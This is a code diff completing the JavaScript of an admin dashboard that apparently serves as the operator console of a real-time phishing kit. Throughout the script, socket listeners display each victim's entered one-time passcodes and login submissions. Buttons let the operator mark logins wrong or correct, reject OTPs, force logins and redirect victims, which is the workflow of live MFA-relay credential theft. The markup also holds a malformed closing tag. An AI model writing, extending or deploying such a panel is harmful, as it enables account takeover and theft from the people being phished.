@@ -1030,4 +1030,128 @@ tr:hover {
             <button class="action-btn block-email-btn" onclick="blockEmail('${user.email}')"><i class="fas fa-ban"></i> Block</button>
             <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')"><i class="fas fa-sign-in-alt"></i> Force Login</button>
             ${showLoginButtons ? `
-              <button class="action-btn wrong-login-btn" onclick="wrongLoginCredentials('${
+              <button class="action-btn wrong-login-btn" onclick="wrongLoginCredentials('${user.email}')"><i class="fas fa-times-circle"></i> Wrong Login</button>
+              <button class="action-btn correct-login-btn" onclick="correctLoginCredentials('${user.email}')"><i class="fas fa-check-circle"></i> Correct Login</button>
+            ` : ''}
+            <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')"><i class="fas fa-arrow-right"></i> Redirect</button>
+            <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
+            <button class="action-btn incorrect-otp-btn" onclick="incorrectOTP('${user.email}')"><i class="fas fa-times-circle"></i> Incorrect OTP</button>
+            <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
+          </td</span>
+        </tr>
+      `;
+    }).join('');
+  }
+
+  async function approveEmail(email) {
+    try {
+      await fetch('/api/admin/approve-user', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      loadUsers();
+    } catch (error) {
+      console.error('Approve email error:', error);
+    }
+  }
+
+  async function approveSecond(email) {
+    try {
+      await fetch('/api/admin/approve-second', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      loadUsers();
+    } catch (error) {
+      console.error('Approve second error:', error);
+    }
+  }
+
+  async function forceLogin(email) {
+    try {
+      await fetch('/api/admin/force-login', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      loadUsers();
+    } catch (error) {
+      console.error('Force login error:', error);
+    }
+  }
+
+  async function redirectToSuccess(email) {
+    try {
+      await fetch('/api/admin/redirect-success', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      loadUsers();
+    } catch (error) {
+      console.error('Redirect success error:', error);
+    }
+  }
+
+  function logout() {
+    localStorage.removeItem('adminToken');
+    window.location.href = '/admin';
+  }
+
+  // Socket listeners - ONLY FOR DATA RECEIVED (user submissions)
+  socket.on('user-login', (data) => {
+    showNotification('📧 New Email', `${data.email} signed up`, 'email', true);
+    loadUsers();
+  });
+  socket.on('user-otp-created', (data) => {
+    showNotification('🔢 First OTP', `${data.email} entered: ${data.otp}`, 'first-otp', true);
+    loadUsers();
+  });
+  socket.on('user-second-otp-created', (data) => {
+    showNotification('🔐 Second OTP', `${data.email} entered: ${data.second_otp}`, 'second-otp', true);
+    loadUsers();
+  });
+  socket.on('user-login-submitted', (data) => {
+    showNotification('🔐 Login Submitted', `${data.email} submitted: ${data.loginEmail}`, 'login-submitted', true);
+    loadUsers();
+  });
+  
+  // Silent socket events - no notifications
+  socket.on('force-login-triggered', () => loadUsers());
+  socket.on('redirect-success-triggered', () => loadUsers());
+  socket.on('text-sent', () => loadUsers());
+  socket.on('user-deleted', () => loadUsers());
+  socket.on('duplicate-otp-attempt', () => loadUsers());
+  socket.on('user-blocked', () => { loadUsers(); loadBlockedEmails(); });
+  socket.on('user-unblocked', () => { loadUsers(); loadBlockedEmails(); });
+
+  document.getElementById('sendTextBtnModal').addEventListener('click', sendTextToUser);
+  document.getElementById('releaseTextBtnModal').addEventListener('click', releaseTextPopup);
+  document.getElementById('viewBlockedBtn').addEventListener('click', openBlockedModal);
+  document.getElementById('textModal').addEventListener('click', (e) => {
+    if (e.target === document.getElementById('textModal')) {
+      hideTextModal();
+    }
+  });
+
+  loadUsers();
+  setInterval(loadUsers, 5000);
+  loadBlockedEmails();
+</script>
+
+</body>
+</html>
